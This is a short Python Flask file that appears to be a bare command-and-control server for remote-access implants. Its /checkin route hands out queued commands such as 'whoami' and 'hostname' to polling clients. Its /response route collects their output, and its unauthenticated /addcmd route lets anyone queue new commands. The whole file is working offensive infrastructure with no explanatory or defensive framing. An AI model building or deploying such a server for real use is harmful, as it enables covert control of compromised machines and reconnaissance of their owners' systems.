from flask import Flask, request, abort
import queue

app = Flask(__name__)
outgoingcommands = queue.Queue()
for cmd in ["whoami", "cd", "hostname"]:
    outgoingcommands.put(cmd)

@app.route("/checkin", methods = ['GET'])
def checkin():
    try:
        return outgoingcommands.get_nowait()
    except:
        abort(404)

@app.route("/response", methods = ['POST'])
def response():
    print(request.data)
    return "ok"

@app.route("/addcmd", methods = ["POST"])
def addcmd():
    outgoingcommands.put(request.data)
    return "ok"


if __name__ == '__main__':
    app.run()